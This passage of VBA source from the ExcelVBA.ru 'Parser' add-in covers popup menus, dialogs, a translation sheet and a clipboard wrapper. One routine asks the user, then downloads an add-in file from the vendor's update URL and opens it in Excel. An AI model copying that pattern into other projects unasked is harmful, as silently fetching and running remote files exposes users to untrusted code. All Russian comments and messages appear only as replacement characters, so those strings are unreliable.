    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| VariableNameList$ (|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| VariableNameList$="")
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| FALSE |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim WP As WebsiteParser, Vars As Variables, var_name, Var As Variable

    Set WP = RunningParser
    If WP Is Nothing Then Set WP = AllParsers.GetActiveParser:  WP.RunParserStart
    If WP Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    If Len(VariableNameList$) Then
        Set Vars = New Variables: Set Vars.Parent = WP
        For Each var_name In Split(VariableNameList$, ";")
            Set Var = Nothing: Set Var = WP.Variables.GetItemByName(CStr(var_name))
            If Not Var Is Nothing Then Vars.Items.Add Var
        Next
    Else
        Set Vars = WP.Variables
    End If
    If Vars.Items.Count = 0 Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & WP.Name & "|fffd|", vbCritical: Exit Function

    VariablesDialogResult = False
    Set VariablesToShow = Vars
    F_Variables.Show
    Set VariablesToShow = Nothing
    ShowVariablesDialog = VariablesDialogResult    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    If TEST_ACTIONS_MODE Then Vars.ShowInfo
    ' Vars.ShowInfo
    Set WP = Nothing
End Function



Attribute VB_Name = "mod__AutoColumns"
'---------------------------------------------------------------------------------------
' Module        : mod__AutoColumns                    Version:
' Author        : Igor Vakhnenko                   Date: 13.11.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Sub test_popup()
    On Error Resume Next
    Dim menu As CommandBar
    Application.CommandBars("AutoColumns2").Delete
    Set menu = GetCommandBar("AutoColumns2", True, msoBarPopup)

    '    Add_Control menu, ct_BUTTON, 548, "", "", msoButtonIconAndCaption, True
    '    Add_Control menu, ct_COMBOBOX, 11, "", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| DIV class = ", msoButtonIconAndCaption, True
    '    Add_Control menu, ct_TEXTBOX, 15, "", "", msoButtonIconAndCaption, True
    '    Add_Control menu, ct_DROPDOWN, 15, "", "", msoButtonIconAndCaption, True
    Set a = Add_Control(menu, ct_POPUP, 15, "", "", msoButtonIconAndCaption, True)
    Set b = Add_Control(a, ct_POPUP, 15, "", "", msoButtonIconAndCaption, True)
    Call Add_Control(b, ct_POPUP, 15, "", "", msoButtonIconAndCaption, True)
    Call Add_Control(b, ct_POPUP, 15, "", "", msoButtonIconAndCaption, True)
    Set c = Add_Control(b, ct_POPUP, 15, "MoveOverPopup", "test", msoButtonIconAndCaption, True)
    Add_Control c, ct_BUTTON, 548, "", "v1", msoButtonIconAndCaption, True
    Add_Control c, ct_BUTTON, 548, "", "v2", msoButtonIconAndCaption, True
    Add_Control c, ct_BUTTON, 548, "", "v3", msoButtonIconAndCaption, True

    Call Add_Control(b, ct_POPUP, 15, "", "", msoButtonIconAndCaption, True)

    Dim combo As CommandBarComboBox
    Set combo = Add_Control(menu, ct_DROPDOWN, 0, "ChangeComboInPopup", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| DIV class = ", msoComboNormal, True, "Tag1")
    Set combo = Add_Control(menu, ct_DROPDOWN, 0, "", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| SPAN class = ", msoComboNormal, True, "Tag1")
    combo.Style = msoComboLabel
    arr = Array("name", "title", "description", "content", "menu")
    For i = LBound(arr) To UBound(arr): combo.AddItem arr(i): Next i
    combo.OnAction = "'" & ThisWorkbook.Name & "'!ChangeComboInPopup"
    combo.ListIndex = 1

    menu.ShowPopup

End Sub

Sub MoveOverPopup()
    On Error Resume Next
    With Application.CommandBars.ActionControl
        text$ = .text
        Tag$ = .Tag
        Caption$ = .Caption
        cnt = .Controls.Count
        Debug.Print "move", text$, Tag$, Caption$, cnt

        .Caption = Caption$ & " (waiting..)"
        For i = 1 To 150000: DoEvents: Next
        .Caption = Caption$
    End With
End Sub

Sub ChangeComboInPopup()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    text$ = Application.CommandBars.ActionControl.text
    Tag$ = Application.CommandBars.ActionControl.Tag
    Debug.Print text$, Tag$
End Sub
Attribute VB_Name = "mod__POPUP"
'---------------------------------------------------------------------------------------
' Module        : mod__POPUP                    Version: 1
' Author        : Igor Vakhnenko                   Date: 04.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Private Module

Public POPUP_MENU_RESULT As String

Sub CreatePopupMenu_ColumnList(ByRef OC As OutputColumn)
    On Error Resume Next
    POPUP_MENU_RESULT = ""
    Dim menu As CommandBar, Header As Object, ExportMenu As Object, ColumnOrderMenu As Object
    
    Application.CommandBars("ParserEditorPopup").Delete
    Set menu = GetCommandBar("ParserEditorPopup", True, msoBarPopup)
    
    Set Header = Add_Control(menu, ct_BUTTON, 487, "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & OC.Name & "|fffd|", msoButtonIconAndCaption, True)
    Header.Enabled = False
    
    Set ColumnOrderMenu = Add_Control(menu, ct_POPUP, 0, "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True)
    Add_Control ColumnOrderMenu, ct_BUTTON, 38, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True, "up|1"
    Add_Control ColumnOrderMenu, ct_BUTTON, 40, "PopupMenu_Order", "|fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, 0, "down|1"
    Add_Control ColumnOrderMenu, ct_BUTTON, 154, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True, "up|2"
    Add_Control ColumnOrderMenu, ct_BUTTON, 157, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, 0, "down|2"
    Add_Control ColumnOrderMenu, ct_BUTTON, 316, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True, "up|3"
    Add_Control ColumnOrderMenu, ct_BUTTON, 317, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, 0, "down|3"
    
    Set ExportMenu = Add_Control(menu, ct_POPUP, 0, "MoveOverMenu_Export", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True)
    
    menu.ShowPopup
End Sub

Sub CreatePopupMenu_ActionSets(ByRef ASet As ActionSet)
    On Error Resume Next
    POPUP_MENU_RESULT = ""
    Dim menu As CommandBar, Header As Object, ExportMenu As Object, ColumnOrderMenu As Object
    
    Application.CommandBars("ParserEditorPopup").Delete
    Set menu = GetCommandBar("ParserEditorPopup", True, msoBarPopup)
    
    Set Header = Add_Control(menu, ct_BUTTON, 487, "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ASet.Name & "|fffd|", msoButtonIconAndCaption, True)
    Header.Enabled = False
    
    If ASet.Source = "" Then
        Set ColumnOrderMenu = Add_Control(menu, ct_POPUP, 0, "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True)
        Add_Control ColumnOrderMenu, ct_BUTTON, 38, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True, "up|1"
        Add_Control ColumnOrderMenu, ct_BUTTON, 40, "PopupMenu_Order", "|fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, 0, "down|1"
        Add_Control ColumnOrderMenu, ct_BUTTON, 154, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True, "up|2"
        Add_Control ColumnOrderMenu, ct_BUTTON, 157, "PopupMenu_Order", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, 0, "down|2"
    End If
    
    Set ExportMenu = Add_Control(menu, ct_POPUP, 0, "MoveOverMenu_Export", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True, ASet.Source)
    
    menu.ShowPopup
End Sub

Sub MoveOverMenu_Export(Optional ByVal Tag$)
    On Error Resume Next
    Dim cbc As CommandBarPopup, arr, i&, ResFileName$, Caption$, cnt&
    Set cbc = Application.CommandBars.ActionControl
    If cbc.Controls.Count Then Exit Sub
    
    arr = All_RF.ArrayOfNames
    With cbc
        '.Reset
        '        While .Controls.Count
        '            .Controls.item(1).Delete
        '        Wend
        Caption$ = .Caption
        .Caption = Caption$ & " (waiting..)"
        
        Add_Control cbc, ct_BUTTON, 371, "ExportObjectFromContextMenu", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", msoButtonIconAndCaption, True, ""
        For i = LBound(arr) + 1 To UBound(arr)
            ResFileName$ = arr(i)
            If ResFileName$ & RESOURCE_FILE_EXT$ <> Tag$ Then
            cnt& = cnt& + 1
                Add_Control cbc, ct_BUTTON, 371, "ExportObjectFromContextMenu", "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ResFileName$, msoButtonIconAndCaption, cnt& = 1, ResFileName$
            End If
        Next
        .Caption = Caption$
    End With
End Sub

Sub ExportObjectFromContextMenu(Optional ByVal RFile$)
    POPUP_MENU_RESULT = "export\\\current\\\" & RFile$
End Sub

Sub PopupMenu_Order(Optional ByVal SelectedOption$)
    POPUP_MENU_RESULT = "move\\\current\\\" & SelectedOption$
End Sub

Attribute VB_Name = "sh_actions"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "shm"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Add-in        : Parser                    URL: http://excelvba.ru/programmes/Parser
'
' Author        : Igor Vakhnenko            Date: 24.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

#If VBA7 Then        '  Office 2010-2013
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
            (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
             ByVal dwReserved As LongPtr, ByVal lpfnCB As LongPtr) As LongPtr
#Else        '  Office 2003-2007
    Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                               (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                                                ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
#End If

Sub RunBuiltinParser()
    On Error Resume Next
    If Not AddinStarted Then Exit Sub
    Application.Run "RunBuiltinParser_FromWorksheet", ActiveSheet
End Sub

Sub ShowBuiltinParser()
    On Error Resume Next
    If Not AddinStarted Then Exit Sub
    Application.Run "ShowBuiltinParser_FromWorksheet", ActiveSheet
End Sub

Function AddinStarted() As Boolean
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser
    test$ = Application.Run("ParserAddinTest")
    If Err.Number = 0 Then AddinStarted = True: Exit Function

    If Err.Number = 1004 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        AddinPath$ = GetSetting("Parser", "Setup", "AddinPath", "")
        If FileExists(AddinPath$) Then
            Set WB = Workbooks.Open(AddinPath$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            t = Timer: Err.Raise 777
            While (Err > 0) And (Abs(Timer - t) < 6)
                Err.Clear: DoEvents: test$ = Application.Run("ParserAddinTest")        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Wend
            If Err.Number = 0 Then AddinStarted = True: Exit Function
        End If
    End If

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ttl$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|Parser|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
    If MsgBox(msg, vbQuestion + vbOKCancel, ttl$) = vbCancel Then Exit Function

    URL$ = "http://excelvba.ru/updates/download.php?addin=Parser"
    AddinPath$ = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\Parser.xla"

    Kill AddinPath$
    If URLDownloadToFile(0, URL$, AddinPath$, 0, 0) = 0 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If FileExists(AddinPath$) Then
            Workbooks.Open AddinPath$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Err.Clear: test$ = Application.Run("ParserAddinTest")        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If Err.Number = 0 Then AddinStarted = True: Exit Function
        End If
    End If

    msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| ExcelVBA.ru" & vbNewLine & _
           "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
           "|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|Parser|fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"

    MsgBox msg$, vbExclamation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    CreateObject("wscript.Shell").Run "http://excelvba.ru/programmes/Parser"
End Function

Private Function FileExists(ByVal FileName$) As Boolean
    On Error Resume Next: FileExists = CreateObject("Scripting.FileSystemObject").FileExists(FileName$)
End Function
Attribute VB_Name = "shtr"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 08.01.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Const prefix$ = "MENU"

Function NewTranslateID() As String
    On Error Resume Next
    Dim ra As Range, coll As New Collection
    Set ra = shtr.Range(shtr.Range("a" & TRANSLATE_SHEET_FIRST_ROW), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    arr = ra.value
    For i = LBound(arr) To UBound(arr)
        coll.Add arr(i, 1), CStr(arr(i, 1))
    Next i

    For i = 1 To 1000
        Err.Clear: ID$ = prefix$ & "_" & Format(i, "0000")
        coll.Add ID$, ID$
        If Err = 0 Then NewTranslateID = ID$: Exit Function
    Next
    MsgBox "Can't create ID$", vbExclamation, "Function NewTranslateID()"
End Function

Function clipBoardText()
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        clipBoardText = .GetText
    End With
End Function

Sub SetClipboardText(ByVal txt$)
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText txt$
        .PutInClipboard
    End With
End Sub

Private Sub Worksheet_BeforeDoubleClick(ByVal Target As Range, Cancel As Boolean)
    On Error Resume Next
    If Target.Column = 1 And Target.Cells.Count = 1 Then
        If Target <> "" Then Cancel = True: SetClipboardText "tt(""" & Target & """) "
    End If
End Sub

Attribute VB_Name = "vbaClipboard"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
' https://social.msdn.microsoft.com/Forums/office/en-US/ee9e0d28-0f1e-467f-8d1d-1a86b2db2878/a-clipboard-object-for-vba-including-microsoft-word
' modified by me (64-bit version added)

Option Explicit

#If VBA7 Then        ' Office 2010-2013
    Private Declare PtrSafe Function OpenClipboard Lib "USER32" (ByVal Hwnd As LongPtr) As Long
    Private Declare PtrSafe Function CloseClipboard Lib "USER32" () As Long
    Private Declare PtrSafe Function EmptyClipboard Lib "USER32" () As Long
    Private Declare PtrSafe Function EnumClipboardFormats Lib "USER32" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function GetClipboardFormatName Lib "USER32" Alias "GetClipboardFormatNameA" (ByVal wFormat As Long, ByVal lpString As String, ByVal nMaxCount As Long) As Long
    Private Declare PtrSafe Function RegisterClipboardFormat Lib "USER32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long

    'Note that we do not use the GetClipboardDataA declaration
    'Public Declare PtrSafe Function GetClipboardData Lib "user32" Alias "GetClipboardDataA" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function GetClipBoardData Lib "USER32" Alias "GetClipboardData" (ByVal wFormat As Long) As LongPtr

    Private Declare PtrSafe Function SetClipboardData Lib "USER32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
    Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
    Private Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr

    'NOTE: the lstrCpy declaration you get from the VB6 API Viewer is WRONG. It's version is this:
    'Private Declare PtrSafe Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
    'The correct version for (at least for Windows 7 / 64-bit is this:
    Private Declare PtrSafe Function lstrCpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As LongPtr

    Private Declare PtrSafe Function IsClipboardFormatAvailable Lib "USER32" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function GlobalSize Lib "kernel32" (ByVal hMem As LongPtr) As Long
    Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As LongPtr
    Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr

#Else        ' Office 2003-2007
    Private Declare Function OpenClipboard Lib "USER32" (ByVal hwnd As Long) As Long
    Private Declare Function CloseClipboard Lib "USER32" () As Long
    Private Declare Function EmptyClipboard Lib "USER32" () As Long
    Private Declare Function EnumClipboardFormats Lib "USER32" (ByVal wFormat As Long) As Long
    Private Declare Function GetClipboardFormatName Lib "USER32" Alias "GetClipboardFormatNameA" (ByVal wFormat As Long, ByVal lpString As String, ByVal nMaxCount As Long) As Long
    Private Declare Function RegisterClipboardFormat Lib "USER32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long

    'Note that we do not use the GetClipboardDataA declaration
    'Public Declare Function GetClipboardData Lib "user32" Alias "GetClipboardDataA" (ByVal wFormat As Long) As Long
    Private Declare Function GetClipBoardData Lib "USER32" Alias "GetClipboardData" (ByVal wFormat As Long) As Long

    Private Declare Function SetClipboardData Lib "USER32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
    Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
    Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long

    'NOTE: the lstrCpy declaration you get from the VB6 API Viewer is WRONG. It's version is this:
    'Private Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
    'The correct version for (at least for Windows 7 / 64-bit is this:
    Private Declare Function lstrCpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long

    Private Declare Function IsClipboardFormatAvailable Lib "USER32" (ByVal wFormat As Long) As Long
    Private Declare Function GlobalSize Lib "kernel32" (ByVal hMem As Long) As Long
    Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
    Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
#End If

Private Const GMEM_MOVEABLE = &H2
Private Const GMEM_ZEROINIT = &H40
